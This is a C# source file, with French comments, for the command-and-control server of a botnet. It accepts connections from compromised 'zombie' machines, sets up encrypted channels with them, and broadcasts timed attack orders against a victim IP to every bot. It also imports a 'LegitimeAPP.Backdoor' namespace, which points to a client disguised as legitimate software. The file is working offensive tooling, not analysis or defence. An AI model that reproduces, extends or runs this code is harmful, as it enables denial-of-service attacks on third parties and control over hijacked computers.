using System;
using System.Net;
using System.Net.Sockets;
using System.Collections;
using System.Collections.Generic;
using System.Timers;
using System.Threading;
using System.Text;

using BotnetAPP.Shared;
using LegitimeAPP.Backdoor;
using System.Linq;


/*
CODE :

1 : Requête de connexion 

*/

namespace BotnetAPP.Network
{
    public class Connection
    {

        private readonly int _listenPort = 2401;
        private readonly string _decryptionCode = "pCw0bX$7OLQEI1!o^y%nc3^#";
        public Boolean AttackInProgress;
        private Dictionary<Zombie, Socket> _connectedBot;


        private ConnectedBotList _bot;

        // Timer 
        public System.Timers.Timer TimerAttack;

        // Event
        public event EventConnectionHandler NewConnectedBot;
        public event EventConnectionHandler NewDisconnectionBot;

        public event EventConnectionHandler UpdateAction;
        public event EventConnectionHandler NewAttack;
        public event EventConnectionHandler EndAttack;



        // Thread
        private Thread _checkingConnectionRequest;
        private Thread _checkingBotDisconnection;
        private Thread _checkingChangeBotAction;
        private Thread _timerThread;

        private Encryption _encryption ; 

        private ASCIIEncoding _asen = new ASCIIEncoding();


        public Dictionary<Zombie, Socket> GetConnectedBot => _bot.Connected;

        // méthode permettant de déclencher les événements 
        public void OnNewConnectedBot(Zombie zombie) => NewConnectedBot?.Invoke(zombie);
        public void OnDisconnectionBot(Zombie zombie) => NewDisconnectionBot?.Invoke(zombie);
        public void OnUpdateAction(Zombie zombie) =>  UpdateAction?.Invoke(zombie);
        public void OnNewAttack(Zombie zombie) => NewAttack?.Invoke(zombie);
        public void OnEndAttack(Zombie zombie) => EndAttack?.Invoke(zombie);

        public Connection()
        {

            // Initialisation de la liste contenant les utilisateurs connectés 
            TimerAttack = new();


            _encryption = new Encryption() ; 

            _bot = new ConnectedBotList();


            AttackInProgress = false;

            // Initialisation des threads et démarrage

            _checkingConnectionRequest = new Thread(ListenConnectionRequest);
            _checkingBotDisconnection = new Thread(CheckBotsDisconnections);
            _checkingChangeBotAction = new Thread(UpdateBotAction);


            _checkingConnectionRequest.Name = "Checking connection request";
            _checkingBotDisconnection.Name = "Checking Bot Disconnection";
            _checkingChangeBotAction.Name = "Checking Change Action Bot ";

            _checkingConnectionRequest.Start();
            _checkingBotDisconnection.Start();
            _checkingChangeBotAction.Start();



        }


        /*

        Lance le timer 

        */



        private void SetTimer(int second)
        {
            TimerAttack = new System.Timers.Timer();

            TimerAttack.Interval = second * 1000;
            TimerAttack.Enabled = true;
            TimerAttack.AutoReset = false;

            TimerAttack.Elapsed += AtEndAttack;



        }


        private void AtEndAttack(Object source, ElapsedEventArgs e)
        {

            OnEndAttack(new Zombie());
            AttackInProgress = false;

            Console.WriteLine("L'attaque est fini ");
        }



        /*
            Ecriture et lecture des messages  envoyés et reçu par l'un des clients

            */

        private string GetIncomingMessage(Socket s)
        {
            byte[] rawMessage = new byte[8192];
            string resultat = "";
            int k = s.Receive(rawMessage);
            for (int i = 0; i < k; i++)
            {
                resultat += Convert.ToChar(rawMessage[i]);
            }

            return resultat;
        }

        // A écrire pour simplifier le processus de communication
        private void WriteNetMessage(string message, Socket s) => s.Send(_asen.GetBytes(message));

        /*
        Dans le cas ou le message est chiffrer on a pas besoin de le convertir en
        bytes 
        */
        private void WriteNetMessage(byte[] message, Socket s) => s.Send(message) ; 


        // Envoie un message a tout les bots connectés 
        private void BroadcastNetMessage(string message)
        {

            var bot = _bot.Connected;

            foreach (KeyValuePair<Zombie, Socket> item in bot)
            {

                // On encrypte avec la clé symétrique partagée avec le client
                WriteNetMessage(Encryption.Encrypt(message, item.Key.SharedSymKey), item.Value);
            }
        }




        public void GiveOrder(Order order)
        {

            Console.WriteLine($"L'attaque contre {order.VictimIP} pendant {order.nbSecond}");
            SetTimer(order.nbSecond);
            BroadcastNetMessage(Data<Order>.DataToXml(order));

            AttackInProgress = true;
        }



        private bool SocketConnected(Socket s) => !((s.Poll(1000, SelectMode.SelectRead) && (s.Available == 0)) || !s.Connected);


        public void UpdateBotAction()
        {
            while (true)
            {



                try
                {


                    Dictionary<KeyValuePair<Zombie, Socket>, TypeAction> MiseAJourZombie = new();




                    var bot = _bot.Connected;

                    foreach (KeyValuePair<Zombie, Socket> item in bot.ToArray())
                    {
                        string message = GetIncomingMessage(item.Value);

                        if (message != "")
                        {

                            MiseAJourZombie[item] = Data<Order>.XmlToData(message).action;
                        }
                    }

                    foreach (KeyValuePair<KeyValuePair<Zombie, Socket>, TypeAction> item in MiseAJourZombie)
                    {
                        _bot.ChangeAction(item.Key.Key, item.Value, item.Key.Value);

                    }


                    OnUpdateAction(new Zombie());


                }
                catch (SocketException ex) {}
                catch (Exception ex)
                {
                    Console.WriteLine(ex.Message);
                }


                // Une seconde avant chaque vérification 
                Thread.Sleep(100);
            }
        }






        public void CheckBotsDisconnections()
        {

            while (true)
            {


                var bot = _bot.Connected;

                foreach (KeyValuePair<Zombie, Socket> item in bot)
                {

                    if (!SocketConnected(item.Value))
                    {
                        _bot.Remove(item.Key);
                        OnDisconnectionBot(item.Key);
                        Console.WriteLine($" {item.Value.RemoteEndPoint} s'est déconnecté");

                    }
                }

                // Une seconde avant chaque vérification

                Thread.Sleep(1000);
            }
        }

        /*
        Ecoute les demandes de connexions 
        */
        public void ListenConnectionRequest()
        {

            IPAddress ipAd = IPAddress.Any;

            TcpListener listen = new TcpListener(ipAd, _listenPort);

            listen.Start();
            while (true)
            {



                Console.WriteLine("Le serveur à démarrer sur le port " + _listenPort.ToString());
                Console.WriteLine("L'adresse ip du serveur  :" + listen.LocalEndpoint);
                Console.WriteLine("On attend la connexion.....");

                Socket s = listen.AcceptSocket() ;

                /*
                Un timeout trop gros pourrait poser problème dans la mesure 
                ou l'envoie d'un message prend plus de 5 secondes

                Dans un environnement local ça pose pas de problème 
                */
                  s.ReceiveTimeout = 100000 ; 

                try
                {
                    Console.WriteLine("Connexion ouverte " + s.RemoteEndPoint);



                    // On récupère la clé publique

                    string symmetricKey = Encryption.GenerateSymKey() ;
                    string asymmectricKey = GetIncomingMessage(s) ;

                    Console.WriteLine("Clé assymétrique obtenue ") ; 

                    Zombie nvZb = new(s.RemoteEndPoint.ToString(), asymmectricKey, symmetricKey);

                    WriteNetMessage(_encryption.Encrypt(symmetricKey, nvZb), s) ;  
                    _bot.Add(nvZb, s);
                    Console.WriteLine("clé symétrique générer est envoyé") ;
                    Console.WriteLine("La clé est {0}"+asymmectricKey) ;
                    
                    OnNewConnectedBot(nvZb);

                        
                    



                    Console.WriteLine($"Nombre de bot connecté : {_bot.Count}");




                }
                catch (Exception ex)
                {
                    // DEBUGGING 
                    Console.WriteLine("[Exception] : " + ex.Message) ; 
                    Console.WriteLine("[Trace] : " + ex.StackTrace);
                }

                Thread.Sleep(1000);


            }
        }
    }
}